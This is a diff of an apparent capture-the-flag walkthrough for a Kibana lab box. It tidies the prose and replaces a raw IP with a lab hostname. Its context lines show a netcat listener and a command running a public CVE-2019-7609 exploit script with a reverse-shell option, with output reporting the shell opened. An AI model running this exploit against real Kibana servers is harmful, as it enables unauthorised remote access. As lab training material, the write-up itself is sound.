@@ -100,13 +100,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.58 seconds
 
 I type that question into google and it shows a result that talks about Prototype pollution.
 
-I ran the following to see that ssh on the target allows password authentication:
-
-```bash
-$ ssh target.thm
-```
-
-I make a note of that and check the site running at http://target.thm. It mentions that linux capabilities are very interesting. I am not familiar with those but I do take a note of it. I don't see much else and so I check http://target.thm:5601 to see what is on that port before I try running directory enumeration on port 80.
+I check the site running at http://target.thm. It mentions that linux capabilities are very interesting. I am not familiar with those but I do take a note of it. I don't see much else and so I check http://target.thm:5601 to see what is on that port before I try running directory enumeration on port 80.
 
 ## What is the version of visualization dashboard installed in the server?
 
@@ -153,8 +147,8 @@ $ nc -lvnp 4444
 Then I run the following:
 
 ```bash
-$ python3 CVE-2019-7609-kibana-rce.py -u http://10.10.223.67:5601 -host <attack_box_ip> -port 4444 --shell
-[+] http://10.10.223.67:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
+$ python3 CVE-2019-7609-kibana-rce.py -u http://target.thm:5601 -host <attack_box_ip> -port 4444 --shell
+[+] http://target.thm:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
 [+] reverse shell completely! please check session on: <attack_box_ip>:4444
 ```
 
